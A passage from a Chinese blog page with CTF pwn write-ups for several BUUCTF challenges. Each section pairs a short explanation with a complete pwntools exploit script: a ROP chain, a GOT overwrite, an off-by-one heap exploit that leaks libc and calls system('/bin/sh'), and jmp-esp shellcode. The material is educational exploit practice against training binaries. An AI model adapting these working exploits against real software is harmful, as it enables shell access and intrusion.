ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"GIVE ME YOUR NAME!\n"</span>,p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a>hitcontraining_unlink</h1><h1 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a>picoctf_2018_got_shell</h1><p>有个后门，0x804854B，程序可以把 4 字节的内容写到一个地址上，把 puts 的 got 表写入后门的地址就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25055</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">win_addr=<span class="number">0x804854B</span></span><br><span class="line">p.sendlineafter(<span class="string">"byte value?"</span>,hex(puts_got))</span><br><span class="line">p.recvuntil(<span class="string">"write to"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"\n"</span>,hex(win_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h1><p>只能申请 26 跟 56 大小的 chunk，在一开始会申请 0x10 大小的 chunk，用来存放用户申请的 size 与指针</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1604056285184-cb8da60a-331e-491c-86de-1986c7573a70.png#align=left&display=inline&height=613&margin=%5Bobject%20Object%5D&name=image.png&originHeight=758&originWidth=470&size=50164&status=done&style=none&width=380" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>edit 的时候有一个 off by one，free 的时候存在 UAF</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1604056480806-f482e951-6038-4f6b-80de-00ebae99c6c1.png#align=left&display=inline&height=114&margin=%5Bobject%20Object%5D&name=image.png&originHeight=121&originWidth=706&size=10362&status=done&style=none&width=666" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1604056528441-830b1cf6-a7e4-427d-8455-43e56667bebd.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=142&originWidth=308&size=7113&status=done&style=none&width=289" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>首先申请两个 0x20 的，因为还有存放用户申请的 size 与 指针的两个 0x20 大小程序自己申请的 chunk，现在一共是 4 个 0x20 大小的 chunk</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1604059465288-0926a92e-d9f2-4eac-b36a-1cf8631fe0c6.png#align=left&display=inline&height=260&margin=%5Bobject%20Object%5D&name=image.png&originHeight=342&originWidth=789&size=68331&status=done&style=none&width=600" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>现在编辑第 0 个（index 从 0 开始）通过 off by one 把 0x603290 也就是记录 index1 的那个 chunk 的 size 改为 0x41，然后把第一个 delete 掉，这样就有了一个 0x20 大小和一个 0x40 大小的 free chunk</p>
+<p>接下来再去 create 一个 0x40 大小的，因为有个 0x20 大小的 free chunk，所以会被用来放 size 与指针，但是他包含在我们申请的 0x20 中的，可以编辑掉，如果编辑为 atoi 的 got 表项就可以通过 show 来，以此得到 libc 的地址然后计算 system 的地址，然后再次编辑 system 函数直接输入 ‘/bin/sh\x00’ 就直接拿到 shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',25010)</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"choice :"</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"(0x10 or 0x20 only) : "</span>,str(size))</span><br><span class="line">  p.sendlineafter(<span class="string">"Content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line">  p.sendlineafter(<span class="string">"Content: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"choice :"</span>,<span class="string">'3'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"choice :"</span>,<span class="string">"4"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">24</span>,<span class="string">'yichen'</span>)</span><br><span class="line">create(<span class="number">24</span>,<span class="string">'writeup'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x41'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">56</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x8</span>)+p64(elf.got[<span class="string">'atoi'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h1><p>存在栈溢出<br>hint 函数中 jmp esp 的地址 0x8048554<br>如果 shellcode 直接放后面会不够大</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">jmpesp = <span class="number">0x8048554</span></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line">payload = shellcode+(<span class="number">36</span>-len(shellcode))*<span class="string">'a'</span>+p32(jmpesp)</span><br><span class="line">payload += asm(<span class="string">'sub esp,40;jmp esp'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-12-29T01:58:39.070Z" itemprop="dateUpdated">2020-12-29 09:58:39</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/10/11/mtpgu8/&title=《BUU-PWN题（81-??）》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/10/11/mtpgu8/&title=《BUU-PWN题（81-??）》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/10/11/mtpgu8/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《BUU-PWN题（81-??）》 — yichen's blog&url=https://yichen115.github.io/2020/10/11/mtpgu8/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/10/11/mtpgu8/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/10/20/qmvuse/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">2018-科来杯</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/10/06/ms60xm/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">ciscn_2019_final_3</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/10/11/mtpgu8/&title=《BUU-PWN题（81-??）》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/10/11/mtpgu8/&title=《BUU-PWN题（81-??）》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/10/11/mtpgu8/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《BUU-PWN题（81-??）》 — yichen's blog&url=https://yichen115.github.io/2020/10/11/mtpgu8/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/10/11/mtpgu8/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/10/11/mtpgu8/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
